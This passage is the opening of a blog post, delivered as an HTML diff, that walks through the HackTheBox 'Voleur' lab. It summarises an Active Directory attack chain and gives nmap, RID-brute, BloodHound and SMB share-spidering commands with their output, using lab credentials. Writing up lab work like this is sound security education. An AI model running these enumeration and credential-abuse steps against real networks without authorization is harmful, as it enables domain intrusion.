@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/11/01/hackthebox-voleur/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewVoleur is a medium-difficulty machine from Hack The Box: download smb share excel file → crack it → kerberoast svc account → WinRM through svc_winrm account → ACL restore → DPAPI abuse → grab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Voleur">
+<meta property="og:url" content="http://fouedsaidi.com/2025/11/01/Hackthebox-Voleur/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewVoleur is a medium-difficulty machine from Hack The Box: download smb share excel file → crack it → kerberoast svc account → WinRM through svc_winrm account → ACL restore → DPAPI abuse → grab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Voleur/Voleur.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Voleur/xslx.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Voleur/blood.png">
+<meta property="article:published_time" content="2025-11-01T09:28:42.000Z">
+<meta property="article:modified_time" content="2025-11-01T11:04:29.809Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Voleur/Voleur.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Voleur -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Voleur</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-01 12:28:42</span>
+        <span class="mobile">2025-11-01 12:28:42</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-01 14:04:29</span>
+            <span class="mobile">2025-11-01 14:04:29</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Voleur is a medium-difficulty machine from Hack The Box: download smb share excel file → crack it → kerberoast svc account → WinRM through svc_winrm account → ACL restore → DPAPI abuse → grab backups (ntds + SYSTEM) → dump hashes → pth to Administrator.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Voleur/Voleur.png"
+                      alt="Voleur-info-card"
+                ><figcaption>Voleur-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-10 17:27:28Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 42:40:39:30:d6:<span class="built_in">fc</span>:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)</span><br><span class="line">|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:<span class="built_in">cd</span>:94 (ECDSA)</span><br><span class="line">|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 13s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-07-10T17:29:05</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1:                                                                                      </span><br><span class="line">|_    Message signing enabled and required </span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that this is a windows domain controller from some specific ports like kerberos 88.<br>First think I started with an rid brute to get all the users (even protected ones):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nxc smb dc.voleur.htb -k -d voleur.htb --rid-brute</span><br><span class="line">SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               498: VOLEUR\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                          </span><br><span class="line">SMB         dc.voleur.htb   445    dc               500: VOLEUR\Administrator (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               501: VOLEUR\Guest (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               502: VOLEUR\krbtgt (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               512: VOLEUR\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               513: VOLEUR\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               514: VOLEUR\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               515: VOLEUR\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               516: VOLEUR\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               517: VOLEUR\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               518: VOLEUR\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               519: VOLEUR\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               520: VOLEUR\Group Policy Creator Owners (SidTypeGroup)                                                                                                      </span><br><span class="line">SMB         dc.voleur.htb   445    dc               521: VOLEUR\Read-only Domain Controllers (SidTypeGroup)                                                                                                     </span><br><span class="line">SMB         dc.voleur.htb   445    dc               522: VOLEUR\Cloneable Domain Controllers (SidTypeGroup)                                                                                                     </span><br><span class="line">SMB         dc.voleur.htb   445    dc               525: VOLEUR\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               526: VOLEUR\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               527: VOLEUR\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               553: VOLEUR\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               571: VOLEUR\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                          </span><br><span class="line">SMB         dc.voleur.htb   445    dc               572: VOLEUR\Denied RODC Password Replication Group (SidTypeAlias)                                                                                           </span><br><span class="line">SMB         dc.voleur.htb   445    dc               1000: VOLEUR\DC$ (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1101: VOLEUR\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1102: VOLEUR\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1103: VOLEUR\ryan.naylor (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1104: VOLEUR\marie.bryant (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1105: VOLEUR\lacey.miller (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1106: VOLEUR\svc_ldap (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1107: VOLEUR\svc_backup (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1108: VOLEUR\svc_iis (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1109: VOLEUR\jeremy.combs (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1112: VOLEUR\First-Line Technicians (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1113: VOLEUR\Second-Line Technicians (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1114: VOLEUR\Third-Line Technicians (SidTypeGroup)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1601: VOLEUR\svc_winrm (SidTypeUser)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               1602: VOLEUR\Restore_Users (SidTypeGroup)</span><br></pre></td></tr></table></figure></div>
+
+<p>I then used the provided credentials to do bloodhound enumeration:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ bloodhound-python -c All -u ryan.naylor  -p <span class="string">&#x27;HollowOct31Nyt&#x27;</span> -d voleur.htb -ns 10.10.11.76 --zip          </span><br><span class="line">INFO: Found AD domain: voleur.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc.voleur.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.voleur.htb</span><br><span class="line">INFO: Found 12 <span class="built_in">users</span></span><br><span class="line">INFO: Found 56 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 5 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.voleur.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 02M 17S</span><br><span class="line">INFO: Compressing output into 20250710132820_bloodhound.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>Later, we used spider_plus module from netexec to download any available network share files:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nxc smb dc.voleur.htb -u <span class="string">&#x27;ryan.naylor&#x27;</span> -p <span class="string">&#x27;HollowOct31Nyt&#x27;</span> -k -M spider_plus -o DOWNLOAD_FLAG=True </span><br><span class="line">SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)</span><br><span class="line">SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt </span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] Started module spidering_plus with the following options:</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*]  DOWNLOAD_FLAG: True</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*]     STATS_FLAG: True</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] EXCLUDE_FILTER: [<span class="string">&#x27;print$&#x27;</span>, <span class="string">&#x27;ipc$&#x27;</span>]</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*]   EXCLUDE_EXTS: [<span class="string">&#x27;ico&#x27;</span>, <span class="string">&#x27;lnk&#x27;</span>]</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*]  MAX_FILE_SIZE: 50 KB</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus</span><br><span class="line">SMB         dc.voleur.htb   445    dc               [*] Enumerated shares</span><br><span class="line">SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark</span><br><span class="line">SMB         dc.voleur.htb   445    dc               -----           -----------     ------</span><br><span class="line">SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin</span><br><span class="line">SMB         dc.voleur.htb   445    dc               C$                              Default share</span><br><span class="line">SMB         dc.voleur.htb   445    dc               Finance                         </span><br><span class="line">SMB         dc.voleur.htb   445    dc               HR                              </span><br><span class="line">SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC</span><br><span class="line">SMB         dc.voleur.htb   445    dc               IT              READ            </span><br><span class="line">SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share </span><br><span class="line">SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share </span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [+] Saved share-file metadata to <span class="string">&quot;/home/kali/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json&quot;</span>.</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Filtered Shares:  1</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total folders found:  27</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total files found:    7</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size average:    3.55 KB</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size min:        22 B</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size max:        16.5 KB</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] File unique exts:     5 (inf, ini, pol, xlsx, csv)</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [*] Downloads successful: 7</span><br><span class="line">SPIDER_PLUS dc.voleur.htb   445    dc               [+] All files processed 